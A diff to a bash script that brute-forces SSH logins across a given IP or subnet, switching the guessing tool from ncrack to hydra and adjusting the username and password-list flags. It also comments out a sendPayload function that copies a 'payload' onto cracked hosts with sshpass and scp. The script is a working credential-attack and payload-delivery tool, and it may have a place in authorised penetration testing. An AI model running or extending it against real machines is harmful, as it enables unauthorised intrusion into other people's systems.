@@ -33,7 +33,7 @@ function sendPayload() {
 
 	# TODO: Is $payload being escaped properly? 
 	# TODO: Sending payload to $HOME on the remote machine, is there a better place for it?
-	sshpass -p "$4" scp -r "$PAYLOAD" "${3}@${1}:/home/${3}:${2}"
+	#sshpass -p "$4" scp -r "$PAYLOAD" "${3}@${1}:/home/${3}:${2}"
 }
 
 # -------------------
@@ -43,8 +43,8 @@ function usage () {
 	echo "Usage: $0"
 	echo "Example: $0 -t 192.168.0.100"
 	echo "Example: $0 -t 192.168.0.0/24"
-	echo "Example: $0 -u username -p password -t 192.168.0.100"
-	echo "Example: $0 -U user_file.txt -P pass_file.txt -t 192.168.0.100"
+	echo "Example: $0 -l username -p password -t 192.168.0.100"
+	echo "Example: $0 -L user_file.txt -P pass_file.txt -t 192.168.0.100"
 	exit 1
 }
 
@@ -74,14 +74,14 @@ function valid_ip() {
 
 
 # Dealing with command line params
-while getopts ":u:U:p:P:s:t:" opts; do
+while getopts ":l:L:p:P:s:t:" opts; do
     case "${opts}" in
 		# Manual username override
-        u)
+        l)
             username=${OPTARG}
             ;;
 		# Manual username override (file)
-        U)
+        L)
             user_file=${OPTARG}
             ;;
 		# Manual password override
@@ -112,19 +112,19 @@ done
 # ----------------------
 # Decide whether or not to use a constant username, or an input username file
 # ie: Constant username, or username input file
-userString="-u '${username}'"
+userString="-l ${username}"
 if [ ! -z "${user_file}" ]; then
 	# Make sure that the file actually exists.
 	if [ ! -r "${user_file}" ]; then
 		echo "$0: cannot access username file '${user_file}'."
 		usage
 	fi
-	userString="-U '${user_file}'"
+	userString="-L '${user_file}'"
 fi
 
 # Decide whether or not to use a constant password, or an input password file
 # ie: Constant password, or password file
-passString="-p '${pass}'"
+passString="-p ${pass}"
 if [ ! -z "${pass_file}" ]; then
 	# Make sure that the file actually exists.
 	if [ ! -r "${pass_file}" ]; then
@@ -151,8 +151,9 @@ fi
 # -- Probing hosts --
 # -------------------
 timestamp=`date +%Y-%m-%d_%H:%M:%S`
-logfile="ncrackProbe_${timestamp}.txt"
-ncrack ${userString} ${passString} -oN '${logfile}' ssh://${target}:${port}
+logfile="hydraProbe_${timestamp}.txt"
+echo "hydra ${userString} ${passString} -o '${logfile}' -s ${port} ${target} ssh"
+hydra ${userString} ${passString} -o ${logfile} -s ${port} ${target} ssh
 
 
 # -- Todo --
